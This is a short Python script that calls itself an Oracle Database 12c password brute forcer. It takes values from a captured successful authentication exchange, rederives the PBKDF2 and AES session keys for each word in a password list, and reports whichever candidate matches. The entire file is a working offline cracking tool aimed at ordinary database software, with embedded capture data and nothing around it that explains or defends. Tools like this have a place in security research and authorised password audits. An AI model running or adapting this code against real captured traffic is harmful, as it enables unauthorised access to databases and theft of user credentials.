# Oracle Database 12c password brute forcer
#
# Uses data from two packets from a successful authentication capture
#
# Rate is about 1000 passwords in less than 3 minutes
#
# Requires:
#             pbkdf2 package (https://pypi.python.org/pypi/pbkdf2)
#             PyCrypto package (https://pypi.python.org/pypi/pycrypto/2.6.1)

# Update this to use your password dictionary
passwords = ['demo', 'epsilon']

# Server authentication packet capture
AUTH_VFR_DATA = 'D922FEE9F8E234A95DAC15E842476AD3'
PBKDF2Salt = 'F05B0CF7F4C981D4808CF6CB4AF69639'
PBKDF2SderCount = 3
PBKDF2VgenCount = 4096
SERVER_AUTH_SESSKEY = '8963123F6B26252274A89F99BCC0874DBC33610223E2B38B75E6A4CD6E634E43'

# Client authentication response packet capture data
AUTH_PASSWORD = '16F0041169FF54075D5C69695BCA25EB4BC549B53F27FA2B649C3D51D8FDF41A'
CLIENT_AUTH_SESSKEY = '2C71F05311768D959E976F29ED4342DB14A89A0B3DBA6670B16CA1B037E97D49'
AUTH_PBKDF2_SPEEDY_KEY = '06F63B7B21765C496285CA2A530BC145290F068DB4FE7E187759040510590BFCD66E407B70DD2F8DC4857FD2F09B9A8FAA42280BC1AB5BFBDF249DC457BF44146AA9106D827E294F50C46058F3C59FC2'


import binascii
import pbkdf2, hashlib, hmac
from Crypto.Cipher import AES

bin_salt = binascii.unhexlify(AUTH_VFR_DATA)
salt = bin_salt + b'AUTH_PBKDF2_SPEEDY_KEY'
bin_client_session_key = binascii.unhexlify(CLIENT_AUTH_SESSKEY)
bin_server_session_key = binascii.unhexlify(SERVER_AUTH_SESSKEY)
bin_PBKDF2Salt = binascii.unhexlify(PBKDF2Salt)
bin_speedy_key = binascii.unhexlify(AUTH_PBKDF2_SPEEDY_KEY)
bin_password = binascii.unhexlify(AUTH_PASSWORD)

def TryPassword(password):
    key = pbkdf2.PBKDF2(password, salt, PBKDF2VgenCount, hashlib.sha512, hmac)
    key_64bytes = key.read(64)

    hash = hashlib.sha512()
    hash.update(key_64bytes)
    hash.update(bin_salt)
    T = hash.digest()

    obj = AES.new(T[0:32], AES.MODE_CBC, '\x00'*16)
    client_generated_random_salt = obj.decrypt(bin_client_session_key)

    obj = AES.new(T[0:32], AES.MODE_CBC, '\x00'*16)
    cryptotext = obj.decrypt(bin_server_session_key)

    decryption_key = pbkdf2.PBKDF2(binascii.hexlify(client_generated_random_salt + cryptotext).upper(), bin_PBKDF2Salt, PBKDF2SderCount, hashlib.sha512, hmac).read(32)
    
    #obj = AES.new(decryption_key, AES.MODE_CBC, '\x00'*16)
    #password_net = obj.decrypt(bin_password)
    #print("Decrypted password: %s" %(password_net[16:]))

    obj = AES.new(decryption_key, AES.MODE_CBC, '\x00'*16)
    cleartext = obj.decrypt(bin_speedy_key)

    if cleartext[16:] == key_64bytes:
        return True
    else:
        return False

for candidate_password in passwords:
    if TryPassword(candidate_password):
        print 'Password is found: %s' %(candidate_password)        
        quit()

print 'Password not found'